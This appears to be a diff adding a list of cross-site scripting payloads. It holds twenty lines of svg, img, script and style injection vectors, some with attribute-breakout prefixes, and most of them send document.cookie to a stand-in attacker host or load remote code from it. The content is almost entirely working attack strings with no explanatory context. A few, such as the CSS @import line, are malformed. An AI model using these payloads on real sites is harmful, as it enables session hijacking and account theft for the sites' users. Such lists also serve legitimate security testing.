@@ -1,0 +1,20 @@
+<svg/onload=print()>
+<img src=x onerror=print()>
+<svg/onload=fetch('https://attacker.com/?c='+document.cookie)>
+<img src=x onerror=fetch('https://attacker.com/?c='+document.cookie)>
+<svg/onload=navigator.sendBeacon('https://attacker.com',document.cookie)>
+<img src=x onerror=import('https://attacker.com/m.js')>
+<script>fetch('https://attacker.com/?c='+document.cookie)</script>
+<script>navigator.sendBeacon('https://attacker.com',document.cookie)</script>
+<script>new Image().src='https://attacker.com/?c='+document.cookie</script>
+<script>document.location='https://attacker.com/?c='+document.cookie</script>
+<svg/onload=window.name=document.cookie>
+<style>@import'https://attacker.com/?c='+document.cookie</style>
+"><svg/onload=fetch(`https://attacker.com/?c=${document.cookie}`)>
+"><img src=x onerror=fetch(`https://attacker.com/?c=${document.cookie}`)>
+'><svg/onload=fetch(`https://attacker.com/?c=${document.cookie}`)>
+<svg onload="fetch('https://attacker.com/?'+document.cookie)">
+<script>fetch(`https://attacker.com/?${document.cookie}`)</script>
+<script>location=`https://attacker.com/?${document.cookie}`</script>
+<img src=x onerror="this.src='https://attacker.com/?'+document.cookie">
+<svg/onload="top.location='https://attacker.com/?'+document.cookie">
